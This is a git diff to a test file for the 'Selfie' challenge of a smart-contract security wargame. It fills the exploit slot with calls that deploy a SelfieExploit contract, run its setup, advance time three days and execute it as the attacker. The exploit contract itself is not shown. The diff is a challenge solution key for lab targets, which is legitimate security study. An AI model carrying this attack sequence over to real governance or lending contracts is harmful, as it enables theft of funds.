@@ -1,9 +1,10 @@
 const { ether, time } = require('@openzeppelin/test-helpers');
-const { accounts, contract } = require('@openzeppelin/test-environment');
+const { accounts, contract, web3 } = require('@openzeppelin/test-environment');
 
 const DamnValuableTokenSnapshot = contract.fromArtifact('DamnValuableTokenSnapshot');
 const SelfiePool = contract.fromArtifact('SelfiePool');
 const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
+const SelfieExploit = contract.fromArtifact('SelfieExploit');
 
 const { expect } = require('chai');
 
@@ -34,6 +35,10 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+      this.exploit = await SelfieExploit.new(this.pool.address, this.governance.address, this.token.address, {from: attacker});
+      await this.exploit.setup({from: attacker});
+      await time.increase(time.duration.days(3));
+      await this.exploit.execute({from: attacker});
     });
 
     after(async function () {
